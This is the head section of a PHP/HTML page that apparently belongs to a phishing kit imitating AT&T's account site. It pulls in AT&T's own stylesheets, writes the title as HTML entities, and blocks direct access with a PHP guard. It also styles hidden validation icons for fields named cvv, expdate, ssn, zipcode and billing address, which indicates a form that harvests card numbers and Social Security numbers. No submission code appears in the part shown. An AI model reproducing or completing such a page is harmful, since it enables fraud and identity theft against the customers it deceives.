<?php 

if (!defined('Myheader')){
	exit('STOP DOING THAT');
}
?>
<!DOCTYPE html><html lang="en" class="hydrated gr__att_com"><head>
<base href="#">
<meta charset="utf-8"><style data-styles="">attwc-globalnav-badge,ccpawc-globalnav-header,ccpagn-mob-menu,ccpawc-globalnav-skipnav,ccpagn-hamburger,ccpagn-mob-menu-cont,wcdgn-header,wcdgn-footer,wcdgn-myaccount-auth,wcdgn-myaccount-unauth,wcdgn-menu-widget,wcdgn-mob-menu,wcdgn-myaccount,wcdgn-myaccount-mob,wcdgn-button,wcdgn-preheader,wcdgn-search,wcdgn-side-arrow,wcdgn-hamburger,wcdgn-mob-menu-cont,wcdgn-dropdown-arrow,wcdgn-dropdown-list,wcdgn-dropdown-modal,attwc-globalnav-header,attwc-globalnav-common-header,attwc-globalnav-footer,attwc-globalnav-navigationstrip,att-wcgn-header-bootstrap,attwc-globalnav-header-firstnet,attwc-globalnav-header-prime,attwc-globalnav-common-footer,attwc-globalnav-firstnet-footer,att-wcgn-header-core,attwc-globalnav-idp-cart,attwc-globalnav-profile,att-wcgn-hamburger-comp,attwc-globalnav-cart,attwc-globalnav-search,attwc-globalnav-skipnav,attwc-globalnav-alerts,attwc-globalnav-header-menu{visibility:hidden}.hydrated{visibility:inherit}</style><meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name="theme-color" content="#000000">
<style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style>
<link rel="stylesheet" type="text/css" href="assets/css/ms.css">
<link rel="icon"  href="assets/img/favicon.ico">
<link rel="stylesheet" href="assets/css/main.css">
<style>
#myDIV {
  display:none;
  width: 100%;
  padding: 50px 0;
  text-align: right;
  background-color: #ffffff;
  margin-top: -40px;
}
</style>
<link rel="stylesheet" href="assets/css/sty.css">
<style>
.fv-plugins-icon[data-field="expdate"] {
    display: none;
}    
.fv-plugins-icon[data-field="bladd"] {
    display: none;
}   
.fv-plugins-icon[data-field="cvv"] {
    display: none;
}    
.fv-plugins-icon[data-field="noc"] {
    display: none;
}    
.fv-plugins-icon[data-field="zipcode"] {
    display: none;
}    
.fv-plugins-icon[data-field="ssn"] {
    display: none;
}    

.form-control .fa-question-circle-o { 
  display: block; 
  position: absolute; 
  left: 310px; 
  top: 20px;
  size: 70px;
}
</style>
<style> 
        .input-icons i { 
            position: absolute; 
        } 
          
        .input-icons { 
            width: 100%; 
            margin-bottom: 10px; 
        } 
          
        .icon { 
            padding: 10px; 
            min-width: 40px; 
        } 
          
        .input-field { 
            width: 100%; 
            padding: 10px; 
            text-align: center; 
        } 
    </style> 
		 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://www.att.com/acctmgmt/static/css/main.75f002c2c1d457c32918.css">
<link rel="stylesheet" href="https://www.att.com/ui/frameworks/css/v1.0.0/core-global-styles-fonts.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <link rel="stylesheet" href="assets/dist/css/formValidation.min.css">
<title>&#x41;&#x54;&amp;&#x54;</title>

  </head>